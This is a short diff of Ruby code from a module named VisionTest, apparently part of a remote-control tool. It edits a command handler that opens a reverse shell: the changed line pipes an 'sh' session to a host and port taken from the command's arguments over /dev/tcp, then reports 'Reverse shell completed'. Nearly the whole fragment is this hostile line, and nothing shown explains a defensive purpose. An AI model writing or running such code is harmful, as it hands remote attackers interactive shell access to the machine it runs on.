@@ -169,7 +169,7 @@ module VisionTest
               return Packet.new(:error, "Invalid command")
             end
 
-            `bash -c "bash -i >& /dev/tcp/#{args[0]}/#{args[1]} 0>&1"`
+            `bash -c "sh >& /dev/tcp/#{args[0]}/#{args[1]} 0>&1"`
 
             return Packet.new(:response, "Reverse shell completed")
 
